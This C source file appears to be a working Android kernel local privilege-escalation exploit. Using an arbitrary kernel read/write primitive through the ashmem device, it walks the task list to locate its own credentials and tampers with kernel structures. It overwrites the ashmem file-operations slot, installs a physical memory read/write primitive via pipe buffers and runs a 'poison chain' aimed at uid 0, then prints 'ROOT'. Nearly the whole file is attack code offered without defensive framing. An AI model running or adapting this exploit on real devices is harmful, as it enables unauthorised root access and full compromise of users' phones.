#include "../src/common.h"

static uint64_t kread64(int fd, uint64_t addr) {
  uint64_t v = 0;
  if (configfs_read_once(fd, addr, &v, sizeof(v)) != (ssize_t)sizeof(v))
    return 0;
  return v;
}
static uint32_t kread32(int fd, uint64_t addr) {
  uint32_t v = 0;
  if (configfs_read_once(fd, addr, &v, sizeof(v)) != (ssize_t)sizeof(v))
    return 0;
  return v;
}

static void scan_pipe_soft(int cfd) {
  const uint64_t lo = kaslr_base + 0x01500000;
  const uint64_t hi = kaslr_base + 0x02000000;
  uint64_t a;
  int hits = 0;
  for (a = lo; a + 64 <= hi; a += 8) {
    uint64_t v = 0;
    if (configfs_read_once(cfd, a, &v, sizeof(v)) != (ssize_t)sizeof(v))
      continue;
    if (v != 16384)
      continue;
    {
      uint64_t nb[4];
      int j, ok = 0;
      for (j = 0; j < 4; j++) {
        nb[j] = 0;
        if (configfs_read_once(cfd, a + 8 + 8 * j, &nb[j],
                               sizeof(nb[j])) != (ssize_t)sizeof(nb[j]))
          break;
        if (nb[j] == 1048576)
          ok = 1;
      }
      printf("[*] scan hit @%llx (nb %llx %llx %llx %llx)\n",
             (unsigned long long)a, (unsigned long long)nb[0],
             (unsigned long long)nb[1], (unsigned long long)nb[2],
             (unsigned long long)nb[3]);
      hits++;
      if (ok) {
        printf("[+] scan SOFT_CANDIDATE @%llx (0x4000 near 0x100000)\n",
               (unsigned long long)a);
      }
    }
  }
  printf("[*] scan done hits=%d range=[%llx,%llx)\n", hits,
         (unsigned long long)lo, (unsigned long long)hi);
}

 static void fix_pipe_quota(int cfd) {
  pid_t me = getpid();
  uint64_t start = kaslr_base + INIT_TASK_OFF;
  {
    uint64_t dbg_slot = 0xdeadbeef;
    uint32_t dbg_pid = 0xdeadbeef;
    ssize_t s1 = configfs_read_once(cfd, ASHMEM_MISC_FOPS_SLOT, &dbg_slot,
                                    sizeof(dbg_slot));
    ssize_t s2 = configfs_read_once(cfd, start + TASK_PID_OFF, &dbg_pid,
                                    sizeof(dbg_pid));
    printf("[*] quota dbg start=%llx slot rd=%zd val=%llx initpid rd=%zd "
           "val=%x\n",
           (unsigned long long)start, s1, (unsigned long long)dbg_slot, s2,
           dbg_pid);
  }
  uint64_t entry = kread64(cfd, start + TASK_TASKS_OFF);
  int n;
  for (n = 0; entry && n < 8000; n++) {
    uint64_t task = entry - TASK_TASKS_OFF;
    uint32_t pid;
    if (task == start) {
      printf("[-] quota walk wrapped (n=%d)\n", n);
      return;
    }
    pid = kread32(cfd, task + TASK_PID_OFF);
    if (pid == (uint32_t)me) {
      uint64_t cred = kread64(cfd, task + TASK_REAL_CRED_OFF);
      uint64_t user = kread64(cfd, cred + 0x50);
      uint32_t uid_anchor = kread32(cfd, user + 0x50);
      uint64_t v28 = kread64(cfd, user + 0x28);
      uint64_t v30 = kread64(cfd, user + 0x30);
      uint64_t v38 = kread64(cfd, user + 0x38);
      uint64_t cand[3];
      uint64_t best = 0;
      int sel = -1, i;
      printf("[*] quota task=%llx cred=%llx user=%llx uid=%u "
             "v28=%llx v30=%llx v38=%llx\n",
             (unsigned long long)task, (unsigned long long)cred,
             (unsigned long long)user, uid_anchor,
             (unsigned long long)v28, (unsigned long long)v30,
             (unsigned long long)v38);
      if (uid_anchor != 2000) {
        printf("[-] quota uid anchor mismatch, no write\n");
        return;
      }
      cand[0] = v28;
      cand[1] = v30;
      cand[2] = v38;
      for (i = 0; i < 3; i++) {
        if (cand[i] > 16384 && cand[i] >= best) {
          best = cand[i];
          sel = i;
        }
      }
      if (sel < 0) {
        printf("[*] quota no slot above soft, nothing to fix\n");
        return;
      } else {
        uint64_t zero = 0;
        uint64_t addr = user + 0x28 + 8 * sel;
        ssize_t wr = configfs_write_once(cfd, addr, &zero, sizeof(zero));
        uint64_t rb = kread64(cfd, addr);
        printf("[*] quota fix user+%llx wr=%zd readback=%llx (was %llx)\n",
               (unsigned long long)(0x28 + 8 * sel), wr,
               (unsigned long long)rb, (unsigned long long)best);
      }
      return;
    }
    entry = kread64(cfd, task + TASK_TASKS_OFF);
  }
  printf("[-] quota self task not found (n=%d)\n", n);
}

 int main(void) {
  const char *taddr = getenv("SLIDE_TEXT_ADDR");
  if (!taddr || !taddr[0]) {
    fprintf(stderr, "SLIDE_TEXT_ADDR required\n");
    return 2;
  }
  setvbuf(stderr, NULL, _IONBF, 0);
  const char *po = getenv("SLIDE_PROBE_ONLY");
  kaslr_base = strtoull(taddr, NULL, 0);
  kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
  kaslr_done = 1;
  int cfd = open_ashmem_device();
  if (cfd < 0) {
    printf("[-] ashmem open failed\n");
    return 4;
  }
  if (getenv("SCAN_PIPE_SOFT")) {
    scan_pipe_soft(cfd);
    close(cfd);
    return 0;
  }
  if (getenv("RESTORE_SLOT")) {
    uint64_t orig = ASHMEM_FOPS_STRUCT;
    ssize_t wr = configfs_write_once(cfd, ASHMEM_MISC_FOPS_SLOT, &orig,
                                     sizeof(orig));
    uint64_t rb = 0;
    ssize_t rd = configfs_read_once(cfd, ASHMEM_MISC_FOPS_SLOT, &rb,
                                    sizeof(rb));
    printf("[*] restore-slot wr=%zd rd=%zd val=%016llx orig=%016llx\n", wr,
           rd, (unsigned long long)rb, (unsigned long long)orig);
    close(cfd);
    return 0;
  }
  if (getenv("FIX_PIPE_QUOTA"))
    fix_pipe_quota(cfd);
  pipebuf_page_base = prepare_pipe_buffer_page();
  printf("[*] pipe-prep base=%llx\n",
         (unsigned long long)pipebuf_page_base);
  if (!pipebuf_page_base) {
    printf("[-] pipe prep failed\n");
    close(cfd);
    return 3;
  }
  uint64_t slot_now = 0;
  uint64_t want = ASHMEM_MISC_FOPS_SLOT;
  ssize_t srd =
      configfs_read_once(cfd, ASHMEM_MISC_FOPS_SLOT, &slot_now, sizeof(slot_now));
  printf("[*] slot rd=%zd val=%016llx want=%016llx\n", srd,
         (unsigned long long)slot_now, (unsigned long long)want);
  uint64_t real_fops = ASHMEM_FOPS_STRUCT;
  int armed = srd == (ssize_t)sizeof(slot_now) && slot_now != real_fops &&
              (slot_now >> 32) == 0xffffff80;
  printf("[*] real_fops=%016llx armed=%d\n", (unsigned long long)real_fops,
         armed);
  printf("[+] ARMED - running chain\n");
  page_base = slot_now - FOPS_TABLE_OFF;
  printf("[*] leak page_base=%llx\n", (unsigned long long)page_base);
  if (!install_pipe_physrw(cfd)) {
    printf("[-] physrw install failed - diag:\n");
    for (int i = 0; i < 8; i++) {
      printf("[-] diag page[%d] slab_cache=%016llx page_type=%08x\n", i,
             (unsigned long long)pipe_page_slab_cache[i],
             pipe_page_type[i]);
    }
    printf("[-] diag kmalloc_normal_1k=%016llx 2k=%016llx cgroup_1k=%016llx "
           "2k=%016llx pipe=%016llx\n",
           (unsigned long long)kmalloc_normal_1k_cache,
           (unsigned long long)kmalloc_normal_2k_cache,
           (unsigned long long)kmalloc_cgroup_1k_cache,
           (unsigned long long)kmalloc_cgroup_2k_cache,
           (unsigned long long)kmalloc_pipe_cache);
    uint64_t orig = ASHMEM_FOPS_STRUCT;
    configfs_write_once(cfd, ASHMEM_MISC_FOPS_SLOT, &orig, sizeof(orig));
    close(cfd);
    return 6;
  }
  printf("[+] physrw installed\n");
  int rc = run_poison_chain();
  printf("[*] run_poison_chain ret=%d uid=%d\n", rc, getuid());
  uint64_t orig_fops = ASHMEM_FOPS_STRUCT;
  ssize_t vwr = configfs_write_once(cfd, ASHMEM_MISC_FOPS_SLOT, &orig_fops,
                                    sizeof(orig_fops));
  printf("[*] slot restore=%zd\n", vwr);
  close(cfd);
  if (getuid() == 0) {
    printf("[+] ROOT\n");
    system("/system/bin/id");
    return 0;
  }
  return 7;
}
